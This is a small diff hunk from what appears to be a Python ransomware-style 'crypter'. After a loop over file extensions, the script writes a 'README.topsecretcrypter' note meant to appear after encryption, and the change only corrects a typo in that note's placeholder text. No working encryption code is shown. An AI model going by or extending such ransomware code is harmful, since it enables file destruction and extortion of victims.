@@ -46,7 +46,7 @@ for extension in extensions_list:
 		notify(file_path)
 		
 with open("README.topsecretcrypter","w+") as readme:
-	readme.write("WRITE HERE THE MESSAGE YOU WANT TO APPEAR IN THE README FILE THAT WILL BE GENERATED AFTER ENCRIPTION")
+	readme.write("WRITE HERE THE MESSAGE YOU WANT TO APPEAR IN THE README FILE THAT WILL BE GENERATED AFTER THE ENCRYPTION")
 
 
 EOF
